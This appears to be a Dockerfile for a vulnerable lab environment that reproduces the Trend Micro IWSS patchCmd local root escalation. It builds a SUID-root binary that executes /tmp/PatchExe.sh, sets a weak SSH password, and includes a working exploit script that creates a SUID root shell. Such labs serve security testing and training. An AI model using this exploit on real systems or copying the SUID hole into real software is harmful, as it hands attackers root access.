FROM debian:bookworm-slim

# Install required packages
RUN apt-get update && apt-get install -y \
    openssh-server \
    bash \
    gcc \
    libc6-dev \
    passwd \
    && rm -rf /var/lib/apt/lists/*

# Setup SSH
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo 'lowpriv:password123' | chpasswd

# Simulate the Trend Micro IWSS patchCmd binary.
# The real vulnerability: patchCmd is a SUID root binary that, when called with
# "u root", changes to /tmp and executes PatchExe.sh as root.
# This allows any local user to place a malicious /tmp/PatchExe.sh and get root.
RUN mkdir -p /opt/trend/iwss/data/patch/bin

RUN printf '%s\n' \
    '#include <stdio.h>' \
    '#include <stdlib.h>' \
    '#include <string.h>' \
    '#include <unistd.h>' \
    '#include <sys/types.h>' \
    '' \
    'int main(int argc, char *argv[]) {' \
    '    /* Simulate Trend Micro IWSS patchCmd behavior */' \
    '    /* When called with "u root", it cd to /tmp and runs PatchExe.sh as root */' \
    '' \
    '    if (argc < 3) {' \
    '        fprintf(stderr, "Usage: patchCmd <action> <user>\\n");' \
    '        return 1;' \
    '    }' \
    '' \
    '    if (strcmp(argv[1], "u") != 0) {' \
    '        fprintf(stderr, "Unknown action: %s\\n", argv[1]);' \
    '        return 1;' \
    '    }' \
    '' \
    '    /* Escalate to root (SUID) */' \
    '    setuid(0);' \
    '    setgid(0);' \
    '' \
    '    /* Change to /tmp as the real patchCmd does */' \
    '    if (chdir("/tmp") != 0) {' \
    '        perror("chdir /tmp");' \
    '        return 1;' \
    '    }' \
    '' \
    '    /* Execute PatchExe.sh from /tmp - the vulnerability */' \
    '    /* The real IWSS patchCmd executes this script as root without validation */' \
    '    printf("[patchCmd] Applying patch as user: %s\\n", argv[2]);' \
    '    execl("/bin/bash", "bash", "/tmp/PatchExe.sh", NULL);' \
    '    perror("execl");' \
    '    return 1;' \
    '}' > /tmp/patchCmd.c

RUN gcc -o /opt/trend/iwss/data/patch/bin/patchCmd /tmp/patchCmd.c && \
    chown root:root /opt/trend/iwss/data/patch/bin/patchCmd && \
    chmod 4755 /opt/trend/iwss/data/patch/bin/patchCmd && \
    rm /tmp/patchCmd.c

# Create the exploit script for the lowpriv user (matching the original exploit)
RUN cat <<'EXPLOIT_EOF' > /home/lowpriv/exploit.sh
#!/bin/bash
# Trend Micro IWSS 3.1 Local Privilege Escalation
# Based on Buguroo Offensive Security exploit

cd /tmp
echo "[*] Creating shell file"
echo -e "#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" > PatchExe.sh
echo "[*] Change permissions"
chmod 755 PatchExe.sh
echo "[*] Exploiting patchCmd..."
/opt/trend/iwss/data/patch/bin/patchCmd u root
echo "[*] Checking for SUID shell..."
if [ -f /tmp/rootbash ]; then
    echo "[+] Got r00t! Run: /tmp/rootbash -p"
    /tmp/rootbash -p -c "id"
else
    echo "[-] Exploit failed"
fi
EXPLOIT_EOF

RUN chown lowpriv:lowpriv /home/lowpriv/exploit.sh && \
    chmod +x /home/lowpriv/exploit.sh

# Verify the vulnerability is in place
RUN ls -la /opt/trend/iwss/data/patch/bin/patchCmd && \
    test -u /opt/trend/iwss/data/patch/bin/patchCmd && \
    echo "SUID bit confirmed on patchCmd"

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]